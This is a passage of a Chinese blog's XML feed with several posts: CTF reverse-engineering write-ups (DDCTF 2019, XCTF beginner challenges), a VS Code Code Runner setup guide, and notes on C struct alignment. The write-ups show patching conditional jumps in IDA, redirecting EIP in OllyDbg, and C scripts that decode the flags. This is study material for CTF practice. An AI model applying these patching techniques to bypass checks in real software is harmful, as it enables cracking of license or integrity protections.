srcset="/img/loading.gif" alt="-w917"><br>但是跳转查看发现没什么东西，发现最下方一段不知道有什么用的字符串。静态分析至此，没什么思路了。用od来看看我们输入的字符串会变成什么样。</p><h3 id="OD动态分析"><a href="#OD动态分析" class="headerlink" title="OD动态分析"></a>OD动态分析</h3><p><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739860730789.jpg" srcset="/img/loading.gif" alt="-w555"><br>定位在这个字符串之前应该就可以看到我们输入后被处理后的字符串。<br><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739861642584.jpg" srcset="/img/loading.gif" alt="-w1006"><br>在前面一个函数进行下断点，也可以清楚看到他就是我们刚刚说的加密函数<img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739862054229.jpg" srcset="/img/loading.gif" alt="-w334"><br>这就是一个地址。然后我们输入123测试<br><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739862667897.jpg" srcset="/img/loading.gif" alt="-w361"><br>已经穿进eax。<img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739863094523.jpg" srcset="/img/loading.gif" alt="-w1199"><br>直接F8不进入函数内部，因为我们的目的就看怎么处理了我们输入的字符串。发现变成了<code>mlk</code>。<br>查看下对应的ASCIL:<img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739864384097.jpg" srcset="/img/loading.gif" alt="-w544"><br><strong>可以明显发现处理前的字符与处理后的字符相加都等于158</strong>。</p><h3 id="脚本解密"><a href="#脚本解密" class="headerlink" title="脚本解密"></a>脚本解密</h3><pre><code>#include &lt;iostream&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main() {    char arr[]=&quot;DDCTF{reverseME}&quot;;    for (int i = 0; i &lt; strlen(arr); i++)    {        arr[i]=158-arr[i];    }    printf(&quot;%s&quot;,arr);    }</code></pre><p><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739865575323.jpg" srcset="/img/loading.gif" alt="-w250"><br><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739865898152.jpg" srcset="/img/loading.gif" alt="-w437"><br><strong>%是VC编译的字符串结束标志不用代入。</strong></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>在某在题目中，静态分析加密函数有些困难的时候，往往没有动态分析来的快，感觉动静结合分析是很好的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DDCTF2019-RE-Windows-Reverse&quot;&gt;&lt;a href=&quot;#DDCTF2019-RE-Windows-Reverse&quot; class=&quot;headerlink&quot; title=&quot;DDCTF2019-RE-Windows Reverse&quot;&gt;&lt;/a&gt;DD
      
    
    </summary>
    
    
      <category term="Re" scheme="http://chumen77.xyz/tags/Re/"/>
    
  </entry>
  
  <entry>
    <title>Vscode的简单调教</title>
    <link href="http://chumen77.xyz/2019/11/15/Vs%20code%E7%9A%84%E7%AE%80%E5%8D%95%E8%B0%83%E6%95%99/"/>
    <id>http://chumen77.xyz/2019/11/15/Vs code的简单调教/</id>
    <published>2019-11-15T02:55:26.000Z</published>
    <updated>2020-02-28T07:53:02.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Vscode的简单调教"><a href="#Vscode的简单调教" class="headerlink" title="Vscode的简单调教"></a>Vscode的简单调教</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>VScode是比较适合自己使用的，因为非常的简洁且不臃肿，拓展性还好。并且自己常写代码是就是为了输入输出实现某些功能，基本用不到调试功能。但碍于难以配置各种环境，一直没有用上，失败了很多次。现在又学着整了一下，现在已经吃上了vscode的香。写个博客，记录一下，也可以分析下经验。</p><h2 id="正常设置"><a href="#正常设置" class="headerlink" title="正常设置"></a>正常设置</h2><p><img src="/2019/11/15/Vs code的简单调教/images/15737872236921.jpg" srcset="/img/loading.gif" alt="-w143"></p><p>在这里点击完设置以后，会出现：<br><img src="/2019/11/15/Vs code的简单调教/images/15737872693861.jpg" srcset="/img/loading.gif" alt="-w791"><br>在这里可以设置vscode的各种地方，就如图中一样，需要自己探索一下，然后设置成自己想要的结果。</p><h2 id="配置编译环境"><a href="#配置编译环境" class="headerlink" title="配置编译环境"></a>配置编译环境</h2><p>这里我只用到c/c++和Python就只记录这个了。<br><img src="/2019/11/15/Vs code的简单调教/images/15737878495576.jpg" srcset="/img/loading.gif" alt="-w449"><br>输入C/C++<br><img src="/2019/11/15/Vs code的简单调教/images/15737879247492.jpg" srcset="/img/loading.gif" alt="-w676"><br>在这里进行点个install。<br>PYthon也是同样的操作。</p><h2 id="让代码跑起来"><a href="#让代码跑起来" class="headerlink" title="让代码跑起来"></a>让代码跑起来</h2><p>在应用商店里搜索<strong>Code Runner</strong>。<br><img src="/2019/11/15/Vs code的简单调教/images/15737881342794.jpg" srcset="/img/loading.gif" alt="-w653"><br>这个是个神器，有了它就可以在vscode直接运行各种代码。<br>安装好后把vscode关闭，然后重新打开。</p><h3 id="新建个C-C-文件："><a href="#新建个C-C-文件：" class="headerlink" title="新建个C/C++文件："></a>新建个C/C++文件：</h3><p><img src="/2019/11/15/Vs code的简单调教/images/15737885382202.jpg" srcset="/img/loading.gif" alt="-w677"><br>然后右键<br><img src="/2019/11/15/Vs code的简单调教/images/15737886009237.jpg" srcset="/img/loading.gif" alt="-w287"><br>是可以运行代码的。<br>在右上角：<br><img src="/2019/11/15/Vs code的简单调教/images/15737886490345.jpg" srcset="/img/loading.gif" alt="-w305"><br>这个小三角也可以运行代码。看下效果：<br><img src="/2019/11/15/Vs code的简单调教/images/15737886695093.jpg" srcset="/img/loading.gif" alt="-w1007"></p><h3 id="更改为终端输出"><a href="#更改为终端输出" class="headerlink" title="更改为终端输出"></a>更改为终端输出</h3><p>我们改一下代码：<br>    #include <iostream><br><br>    int main() {<br>        int a;<br>        scanf(“%d”,&amp;a);<br>        printf(“hello world!”);<br><br>    }</iostream></p><p>在这样直接运行后发现：<img src="/2019/11/15/Vs code的简单调教/images/15737890616864.jpg" srcset="/img/loading.gif" alt="-w1070"><br>卡在运行过程且我们无法输入：<br><img src="/2019/11/15/Vs code的简单调教/images/15737891086923.jpg" srcset="/img/loading.gif" alt="-w290"><br>这个解决办法就是<strong>更改为终端输出就可以了</strong>。<br><img src="/2019/11/15/Vs code的简单调教/images/15737891942172.jpg" srcset="/img/loading.gif" alt="-w479"><br>点击配置扩展信息。下滑找到：<br><img src="/2019/11/15/Vs code的简单调教/images/15737893476953.jpg" srcset="/img/loading.gif" alt="-w559"><br>然后打个勾就可以了。<br>运行：<br><img src="/2019/11/15/Vs code的简单调教/images/15737894451238.jpg" srcset="/img/loading.gif" alt="-w677"><br>发现成功了，然后看下其原理就是帮你对终端进行了<br><code>cd &quot;/Volumes/data/c:c++/&quot; &amp;&amp; g++ test.cpp -o test &amp;&amp; &quot;/Volumes/data/c:c++/&quot;test</code>这个命令的执行，发现其是用gcc进行了编译，mac是自带clang的，clang的优点挺多的，<strong>且支持语法错误的检测，</strong>然后就想着去改下让其用clang++来编译。</p><h3 id="自定义运行逻辑"><a href="#自定义运行逻辑" class="headerlink" title="自定义运行逻辑"></a>自定义运行逻辑</h3><p><img src="/2019/11/15/Vs code的简单调教/images/15737891942172.jpg" srcset="/img/loading.gif" alt="-w479"><br>还是进入这个配置里面：<br><img src="/2019/11/15/Vs code的简单调教/images/15737897368419.jpg" srcset="/img/loading.gif" alt="-w411"><br>在settings.json中编辑:</p><pre><code>&quot;code-runner.executorMap&quot; : {       &quot;java&quot;: &quot;cd $dir &amp;&amp; javac $fileName &amp;&amp; java $fileNameWithoutExt&quot;,       &quot;c&quot;: &quot;cd $dir &amp;&amp; clang++ $fileName -o $fileNameWithoutExt &amp;&amp; $dir$fileNameWithoutExt&quot;,       &quot;cpp&quot;: &quot;cd $dir &amp;&amp; clang++ $fileName -o $fileNameWithoutExt &amp;&amp; $dir$fileNameWithoutExt&quot;,       &quot;objective-c&quot;: &quot;cd $dir &amp;&amp; clang++ -framework Cocoa $fileName -o $fileNameWithoutExt &amp;&amp; $dir$fileNameWithoutExt&quot;,       &quot;php&quot;: &quot;php&quot;,       &quot;python&quot;: &quot;python -u&quot;,       &quot;ruby&quot;: &quot;ruby&quot;,   }</code></pre><h4 id="成品："><a href="#成品：" class="headerlink" title="成品："></a>成品：</h4><p><img src="/2019/11/15/Vs code的简单调教/images/15737900505196.jpg" srcset="/img/loading.gif" alt="-w1110"><br>直接粘贴这段代码放入这里面保存就可以了。</p><h4 id="效果："><a href="#效果：" class="headerlink" title="效果："></a>效果：</h4><p><img src="/2019/11/15/Vs code的简单调教/images/15737901558381.jpg" srcset="/img/loading.gif" alt="-w860"><br>实现我们的目的了。</p><h3 id="测试一下Python"><a href="#测试一下Python" class="headerlink" title="测试一下Python"></a>测试一下Python</h3><p>这是直接新建的：<br><img src="/2019/11/15/Vs code的简单调教/images/15737904131858.jpg" srcset="/img/loading.gif" alt="-w430"><br><img src="/2019/11/15/Vs code的简单调教/images/15737904322136.jpg" srcset="/img/loading.gif" alt="-w465"><br>这样就可以一个vscode运行各种代码，对于不是专门做开发，只是写脚本的，就是个福音。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Vscode的简单调教&quot;&gt;&lt;a href=&quot;#Vscode的简单调教&quot; class=&quot;headerlink&quot; title=&quot;Vscode的简单调教&quot;&gt;&lt;/a&gt;Vscode的简单调教&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;head
      
    
    </summary>
    
    
      <category term="vscode" scheme="http://chumen77.xyz/tags/vscode/"/>
    
  </entry>
  
  <entry>
    <title>C语言与反汇编学习（五）</title>
    <link href="http://chumen77.xyz/2019/11/12/C%E8%AF%AD%E8%A8%80%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%94%EF%BC%89/"/>
    <id>http://chumen77.xyz/2019/11/12/C语言与反汇编学习（五）/</id>
    <published>2019-11-12T12:18:49.000Z</published>
    <updated>2020-02-28T07:53:37.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C语言与反汇编学习（五）"><a href="#C语言与反汇编学习（五）" class="headerlink" title="C语言与反汇编学习（五）"></a>C语言与反汇编学习（五）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>主要是记录一下，在学习过程中认为容易忘记且重要的东西，方便以后忘了再来学习一下。<strong>集中于结构体部分以及结构体对齐的知识。</strong></p><h2 id="结构体的使用练习"><a href="#结构体的使用练习" class="headerlink" title="结构体的使用练习"></a>结构体的使用练习</h2><p>1、定义一个结构体Gamer用来存储一个游戏中的角色的信息，包括血值、等级、坐标等信息    。<br>要求：<br>    (1) 具体包含哪些信息自由设计<br>    (2) 但这些包含的类型中，必须要有一个成员是结构体类型。<br>    2、定义一个函数，用来给这个结构体变量赋值.<br>3、定义一个函数，用来显示这个结构体变量的所有成员信息.<br>    #include <iostream><br>    #include &lt;stdio.h&gt;<br>    #include &lt;string.h&gt;<br>    struct point<br>    {<br>        int x;<br>        int y;<br>        int z;<br>    };<br>    struct Gamer<br>    {<br>        char name[20];<br>        int level;<br>        float HP;<br>        point a;<br>    }No1;<br>    void Function()<br>    {<br>        char a[]=”xiaozhi”;<br>        for (int i = 0; i &lt;strlen(a) ; ++i) {<br>            No1.name[i]=a[i];<br>        }<br>        No1.level = 99;<br>        No1.HP = 99.9;<br>        No1.a.x=6;<br>        No1.a.y=5;<br>        No1.a.z=9;<br>    }<br>    void Display()<br>    {<br>        printf(“name:%s level:%d HP:%f point:%d %d %d “,No1.name,No1.level,No1.HP,No1.a.x,No1.a.y,No1.a.z);<br>    }<br>    int main() {<br>        Function();<br>        Display();<br>        return 0;<br>    }</iostream></p><h2 id="sizeof的使用"><a href="#sizeof的使用" class="headerlink" title="sizeof的使用"></a>sizeof的使用</h2><h3 id="基本类型的sizeof"><a href="#基本类型的sizeof" class="headerlink" title="基本类型的sizeof"></a>基本类型的sizeof</h3><p>可以使用类型，也可以使用变量<br>例子：</p><p>printf(“%d\n”,sizeof(char));<br>printf(“%d\n”,sizeof(int));<br>printf(“%d\n”,sizeof(float));<br>printf(“%d\n”,sizeof(double));</p><p>int x = 10;            //变量<br>printf(“%d\n”,sizeof(x));        </p><h3 id="数组类型的sizeof"><a href="#数组类型的sizeof" class="headerlink" title="数组类型的sizeof"></a>数组类型的sizeof</h3><p>例子：<br>    char arr1[10] = {0};<br>    short arr2[10] = {0};<br>    int arr3[10] = {0};                </p><pre><code>printf(&quot;%d\n&quot;,sizeof(arr1));                //10printf(&quot;%d\n&quot;,sizeof(arr2));            //    20printf(&quot;%d\n&quot;,sizeof(arr3));            //    40printf(&quot;%d\n&quot;,sizeof(arr1[10]));            //    1printf(&quot;%d\n&quot;,sizeof(arr2[10]));            //    2printf(&quot;%d\n&quot;,sizeof(arr3[10]));                //4</code></pre><p>注意其中的不同。</p><h2 id="结构体（内存）对齐"><a href="#结构体（内存）对齐" class="headerlink" title="结构体（内存）对齐"></a>结构体（内存）对齐</h2><h3 id="为什么要有内存对齐？"><a href="#为什么要有内存对齐？" class="headerlink" title="为什么要有内存对齐？"></a>为什么要有内存对齐？</h3><p>本质：是要效率还是空间，二选一的结果.统称是性能，还有台移植等因素，编译器对数据结构进行了内存对齐。</p><h3 id="pragma-pack的基本用法"><a href="#pragma-pack的基本用法" class="headerlink" title="pragma pack的基本用法"></a>pragma pack的基本用法</h3><p>在vc6.0++中默认值是8字节对齐。</p><pre><code>    #pragma pack( n )    结构体。    #pragma pack(  )</code></pre><p>该操作会改变一个结构体的字节对齐数，这是针对编译器的。<br>对齐参数：n为字节对齐数，其取值为1、2、4、8，默认是8。<br>如果这个值比结构体成员的sizeof值小，那么该成员的偏移量应该以此值为准，<strong>即是说，结构体成员的偏移量应该取二者的最小值.</strong></p><pre><code>#pragma pack(n)            struct Test            {                 int a ;                 __int64 b ;                 char c ;            };            #pragma pack()            </code></pre><p>以下是各种情况的内存对齐分析:<br>1:1字节对齐<br><img src="/2019/11/12/C语言与反汇编学习（五）/images/15735626712023.jpg" srcset="/img/loading.gif" alt="-w155"><br>2:2字节对齐时：<br><img src="/2019/11/12/C语言与反汇编学习（五）/images/15735626990588.jpg" srcset="/img/loading.gif" alt="-w266"><br>3：4个字节对齐<br><img src="/2019/11/12/C语言与反汇编学习（五）/images/15735627321430.jpg" srcset="/img/loading.gif" alt="-w381"><br>4、8个字节对齐</p><p><img src="/2019/11/12/C语言与反汇编学习（五）/images/15735627463362.jpg" srcset="/img/loading.gif" alt="-w583"></p><h3 id="对齐原则："><a href="#对齐原则：" class="headerlink" title="对齐原则："></a>对齐原则：</h3><p>原则一：数据成员对齐规则：结构的数据成员，第一个数据成员放在offset为0的地方，以后每个数据成员存储的起始位置要从该成员大小的整数倍开始(比如int在32位机为４字节，则要从4的整数倍地址开始存储).                                    </p><p>原则二：结构体的总大小，也就是sizeof的结果，必须是其内部最大成员的整数倍，不足的要补齐。<br>原则三：如果一个结构里有某些结构体成员，则结构体成员要从其内部最大元素大小的整数倍地址开始存储。                                    <strong>(struct a里存有struct b，b里有char，int，double等元素，那b应该从8的整数倍开始存储.)</strong>                                    </p><p>原则四：对齐参数如果比结构体成员的sizeof值小，该成员的偏移量应该以此值为准.<br>    也就是说，结构体成员的偏移量应该取二者的最小值.                                </p><p><strong>由浅入深，分析内存对齐原则后内存到底是怎么分配的</strong></p><h4 id="案例分析一："><a href="#案例分析一：" class="headerlink" title="案例分析一："></a>案例分析一：</h4><pre><code>struct Test                {                    char  a;                    int b ;                };                </code></pre><p><img src="/2019/11/12/C语言与反汇编学习（五）/images/15735632219948.jpg" srcset="/img/loading.gif" alt="-w671"><br><strong>sizeof(Test) =1+3（补齐的）+4=8(其中最大的4的整倍数)</strong></p><h4 id="案例二分析："><a href="#案例二分析：" class="headerlink" title="案例二分析："></a>案例二分析：</h4><pre><code>struct Test                    {                        int a ;                        __int64 b ;                        char c ;                    };                    </code></pre><p><img src="/2019/11/12/C语言与反汇编学习（五）/images/15735634186981.jpg" srcset="/img/loading.gif" alt="-w621"><br><strong>sizeof(Test) =4+4（补齐的）+8+1+7（补齐的）=24(其中最大的8的整倍数)</strong></p><h4 id="案例三分析："><a href="#案例三分析：" class="headerlink" title="案例三分析："></a>案例三分析：</h4><pre><code>struct Test                    {                        int a ;                        __int64 b ;                        char c ;                        char d ;                    };                    </code></pre><p><img src="/2019/11/12/C语言与反汇编学习（五）/images/15735635119907.jpg" srcset="/img/loading.gif" alt="-w662"></p><p><strong>sizeof(Test) =4+4（补齐的）+8+1+1+6（补齐的）=24(其中最大的8的整倍数)</strong></p><h4 id="案例四分析："><a href="#案例四分析：" class="headerlink" title="案例四分析："></a>案例四分析：</h4><pre><code>struct S1        {            char c;        double i;    };        </code></pre><p><img src="/2019/11/12/C语言与反汇编学习（五）/images/15735636051365.jpg" srcset="/img/loading.gif" alt="-w530"></p><p><strong>sizeof(S1) =1+7（补齐的）+8=16(其中最大的8的整倍数)</strong></p><h4 id="案例五分析："><a href="#案例五分析：" class="headerlink" title="案例五分析："></a>案例五分析：</h4><pre><code>struct S2        {            int c1;         char c2[10]; };    </code></pre><p><img src="/2019/11/12/C语言与反汇编学习（五）/images/15735636961393.jpg" srcset="/img/loading.gif" alt="-w547"></p><p><strong>sizeof(S2) =4+10+2（补齐的）=16(其中最大的8的整倍数)</strong></p><h4 id="案例六分析："><a href="#案例六分析：" class="headerlink" title="案例六分析："></a>案例六分析：</h4><pre><code>struct S3        {            char c1;         S1 s;            char c2;         char c3;     };</code></pre><p><img src="/2019/11/12/C语言与反汇编学习（五）/images/15735637638057.jpg" srcset="/img/loading.gif" alt="-w539"></p><p><strong>sizeof(S3) =1+7+1（s中的char c）+7（补齐的）+8（s中的double）+1+1+6（补齐的）=32(其中最大的8的整倍数)</strong></p><h4 id="案例七分析："><a href="#案例七分析：" class="headerlink" title="案例七分析："></a>案例七分析：</h4><pre><code>struct S4        {            char c1;         S1 s;            char c2;         double c3;     };    </code></pre><p><img src="/2019/11/12/C语言与反汇编学习（五）/images/15735639114324.jpg" srcset="/img/loading.gif" alt="-w558"></p><p><strong>sizeof(S4) =1+7+1（s中的char c）+7（补齐的）+8（s中的double）+1+7（补齐的）+8=40(其中最大的8的整倍数)</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;C语言与反汇编学习（五）&quot;&gt;&lt;a href=&quot;#C语言与反汇编学习（五）&quot; class=&quot;headerlink&quot; title=&quot;C语言与反汇编学习（五）&quot;&gt;&lt;/a&gt;C语言与反汇编学习（五）&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;
      
    
    </summary>
    
    
      <category term="c与汇编" scheme="http://chumen77.xyz/tags/c%E4%B8%8E%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>Xctf\_RE新手区WP</title>
    <link href="http://chumen77.xyz/2019/11/09/Xctfre_%E6%96%B0%E6%89%8B%E5%8C%BAwp/"/>
    <id>http://chumen77.xyz/2019/11/09/Xctfre_新手区wp/</id>
    <published>2019-11-09T03:22:03.000Z</published>
    <updated>2020-02-28T07:55:24.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Xctf-RE新手区WP"><a href="#Xctf-RE新手区WP" class="headerlink" title="Xctf_RE新手区WP"></a>Xctf_RE新手区WP</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>学c与反汇编学的有点疲倦了，且实际运用比较少，所以最近一周刷了很多的Re入门题，巩固知识且熟悉下ctf中的RE题目。</p><h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><p>第一步，先查壳：<br><img src="/2019/11/09/Xctfre_新手区wp/images/15732702605654.jpg" srcset="/img/loading.gif" alt="-w625"><br>（查壳很重要，可以先确认是否有壳还可以知道程序是什么语言编写的）<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733071101333.jpg" srcset="/img/loading.gif" alt="-w656"><br>看下程序是干嘛的，也就是你输入flag然后程序出个判断是否正确。<strong>估计就是个明文对比</strong>，直接od打开：<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733074111357.jpg" srcset="/img/loading.gif" alt="-w911"><br>断在了re模块。直接搜索字符串<img src="/2019/11/09/Xctfre_新手区wp/images/15733075097915.jpg" srcset="/img/loading.gif" alt="-w673"><br><img src="/2019/11/09/Xctfre_新手区wp/images/15733072667813.jpg" srcset="/img/loading.gif" alt="-w801"><br>拿到flag</p><h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><p>还是先查壳：<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733077161080.jpg" srcset="/img/loading.gif" alt="-w519"><br>无壳<br>这道题有多种做法，下面展示三种：</p><h3 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h3><p><strong>这个做法主要是判断程序逻辑，然后改关键跳转的汇编代码，进行爆破破解。</strong><br><img src="/2019/11/09/Xctfre_新手区wp/images/15733079095740.jpg" srcset="/img/loading.gif" alt="-w678"><br>先看下程序是做什么的：<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733079517175.jpg" srcset="/img/loading.gif" alt="-w545"><br>先输入个1<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733079675395.jpg" srcset="/img/loading.gif" alt="-w507"><br>发现图案中第1，2，8行图形发生了变化。<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733082372049.jpg" srcset="/img/loading.gif" alt="-w659"><br>接着输入2，然后第3，4，8行图形发生了变化。感觉没什么规律，大概猜一下，应该是这8行的线条全部连通就可以完成这个游戏。<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733085847753.jpg" srcset="/img/loading.gif" alt="-w607"></p><h4 id="打开IDA进行静态分析"><a href="#打开IDA进行静态分析" class="headerlink" title="打开IDA进行静态分析"></a>打开IDA进行静态分析</h4><p><img src="/2019/11/09/Xctfre_新手区wp/images/15733087052533.jpg" srcset="/img/loading.gif" alt="-w489"><br>发现一堆函数难以找到主函数，按<code>shift+F12</code>查看字符串<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733088311433.jpg" srcset="/img/loading.gif" alt="-w909"><br><img src="/2019/11/09/Xctfre_新手区wp/images/15733088160599.jpg" srcset="/img/loading.gif" alt="-w865"><br>点击这个，查看一下这个字符串的交叉引用，然后可以双击跳转到main函数，看整个程序的逻辑。<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733091045568.jpg" srcset="/img/loading.gif" alt="-w746"></p><p>跳转好后按F5查看伪代码：<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733092783647.jpg" srcset="/img/loading.gif" alt="-w471"><br>在下方发现了一个判断语句，满足后会调用sub_45Ab4这个函数。双击进入看看这个函数做了什么：<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733094560784.jpg" srcset="/img/loading.gif" alt="-w465"><br>发现会出现这个字符串，然后：<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733094810614.jpg" srcset="/img/loading.gif" alt="-w387"><br>还经过一堆数据和异或后返回一个字符串。那这个应该就是返回flag了。<strong>那就是想办法让程序调用<code>sub_45Ab4</code>这个函数就可以了。</strong><br><img src="/2019/11/09/Xctfre_新手区wp/images/15733096364506.jpg" srcset="/img/loading.gif" alt="-w307"><br>再看一下这个if语句里面正好是对一个容量为8的数组进行判断，对应刚刚程序中的8行，正好对应当8行直线全部连接（也可以认为是图案全变）就会调用输出flag的函数。</p><p>那现在需要做的就很明确的，直接改程序流程，IDA的patch是可以做到的，结合刚刚我们输入1的时候回让1，2，8行进行改变，那我们就在这几处做改变就可以了。</p><h4 id="IDA-Patch"><a href="#IDA-Patch" class="headerlink" title="IDA Patch"></a>IDA Patch</h4><p><img src="/2019/11/09/Xctfre_新手区wp/images/15733100087904.jpg" srcset="/img/loading.gif" alt="-w423"><br>看主函数的流程图模式，专门找这个跳转指令JNZ，数一下8个就是刚刚的8个判断了。对应刚刚的想法我们在<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733100975029.jpg" srcset="/img/loading.gif" alt="-w394"><br>这几处的汇编代码进行patch：<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733101571151.jpg" srcset="/img/loading.gif" alt="-w504"><br><strong>把JNZ改成正好相反的JZ</strong><br><img src="/2019/11/09/Xctfre_新手区wp/images/15733107484458.jpg" srcset="/img/loading.gif" alt="-w460"></p><p>修改好后查看下生成的伪代码<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733107946575.jpg" srcset="/img/loading.gif" alt="-w375"><br>达到了我们想要的结果。<br>然后我们需要把这些打patch的地方保存下来，让其成效：<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733103617647.jpg" srcset="/img/loading.gif" alt="-w1324"><br>点击ok即可，可以为了安全选择一下做个bak备份。</p><h4 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h4><p><img src="/2019/11/09/Xctfre_新手区wp/images/15733108996551.jpg" srcset="/img/loading.gif" alt="-w564"><br>输入1<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733109139764.jpg" srcset="/img/loading.gif" alt="-w661"><br>拿到了flag。</p><h3 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h3><p>这种主要是在IDA中静态分析后知道了，在程序调用输出flag函数后flag就打印出来了。就可以想办法在动态调试中直接调用这个函数就可以了。重在IDA和OD搭配使用了。</p><h4 id="IDA寻找输出flag函数的函数地址"><a href="#IDA寻找输出flag函数的函数地址" class="headerlink" title="IDA寻找输出flag函数的函数地址"></a>IDA寻找输出flag函数的函数地址</h4><p><img src="/2019/11/09/Xctfre_新手区wp/images/15733116649387.jpg" srcset="/img/loading.gif" alt="-w829"><br><img src="/2019/11/09/Xctfre_新手区wp/images/15733116800264.jpg" srcset="/img/loading.gif" alt="-w702"><br><img src="/2019/11/09/Xctfre_新手区wp/images/15733118131519.jpg" srcset="/img/loading.gif" alt="-w688"><br>记住这个0045E940 地址。下面OD直接想办法执行到该地址</p><h4 id="OD动态调试"><a href="#OD动态调试" class="headerlink" title="OD动态调试"></a>OD动态调试</h4><p><img src="/2019/11/09/Xctfre_新手区wp/images/15733122639383.jpg" srcset="/img/loading.gif" alt="-w498"><br>发现基地址是010F<br>在OD中搜索字符串，找一下我们应该在哪个地方找一个合适的可以控制的代码段。<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733124212188.jpg" srcset="/img/loading.gif" alt="-w692"><br>发现了输入n的语句地址。<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733124483702.jpg" srcset="/img/loading.gif" alt="-w695"><br>设置一个断点，运行程序。F9让程序运行到这里断下来。按空格修改下汇编代码<code>jmp 0x010FE490</code><br><img src="/2019/11/09/Xctfre_新手区wp/images/15733126763356.jpg" srcset="/img/loading.gif" alt="-w688"></p><p><img src="/2019/11/09/Xctfre_新手区wp/images/15733126850272.jpg" srcset="/img/loading.gif" alt="-w205"><br>这时候的EIP，然后单步执行<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733127939834.jpg" srcset="/img/loading.gif" alt="-w869"><br>过来了，到了调用输出flag的函数。然后接下来会有很多循环和字符处理的操作，直接可以按CTRL+F8按键让OD自动执行。让把这个函数处理完，就会出现flag字符串。<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733127636852.jpg" srcset="/img/loading.gif" alt="-w674"></p><p>这种修改EIP是重点和找到合适可控制代码段是重点，我们还可以<br>在找到一个可以控制代码后，在搜索字符串中找到<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733133763253.jpg" srcset="/img/loading.gif" alt="-w637"><br>单击过去，然后在这个函数的开头设置为新的EIP<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733132918043.jpg" srcset="/img/loading.gif" alt="-w622"><br><img src="/2019/11/09/Xctfre_新手区wp/images/15733134257814.jpg" srcset="/img/loading.gif" alt="-w208"><br>然后按一下F8就来到了这个函数里面了。再进行刚刚的操作就可以了。</p><h3 id="第三种"><a href="#第三种" class="headerlink" title="第三种"></a>第三种</h3><p>这个就是我们找到了关键函数，分析以后是可以把这个函数是写出来的，然后根据伪代码写出原来的程序就可以了。</p><h4 id="OD静态分析"><a href="#OD静态分析" class="headerlink" title="OD静态分析"></a>OD静态分析</h4><p><img src="/2019/11/09/Xctfre_新手区wp/images/15733137173061.jpg" srcset="/img/loading.gif" alt="-w682"><br><img src="/2019/11/09/Xctfre_新手区wp/images/15733137433462.jpg" srcset="/img/loading.gif" alt="-w521"><br>调用其函数。双击进入F5生成伪代码：<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733137975116.jpg" srcset="/img/loading.gif" alt="-w555"><br>（只是截取一部分）分析可以得知是分成了2个字符数组，一个V2到V58，一个V59到V115，都是56的长度，然后下面就是两个异或操作了。直接改成C代码，因为还不会写Python。</p><pre><code>#include &lt;iostream&gt;#include &lt;string.h&gt;int main() {        int i;        char arr1[]={123,32,18,98,119,108,65,41,124,80,125,38,124,111,74,49,83,108,94,108,84,6,96,83,44,121,104,110,32,95,117,101,99,123,127,119,96,48,107,71,92,29,81,107,90,85,64,12,43,76,86,13,114,1,117,126,0};        char arr2[]={18,64,98,5,2,4,6,3,6,48,49,65,32,12,48,65,31,78,62,32,49,32,1,57,96,3,21,9,4,62,3,5,4,1,2,3,44,65,78,32,16,97,54,16,44,52,32,64,89,45,32,65,15,34,18,16,0};        for ( i = 0; i &lt; 56; ++i )        {            arr1[i] ^= arr2[i];            arr1[i] ^= 0x13u;        }        printf(&quot;%s&quot;,arr1);    return 0;}</code></pre><p><img src="/2019/11/09/Xctfre_新手区wp/images/15733139966832.jpg" 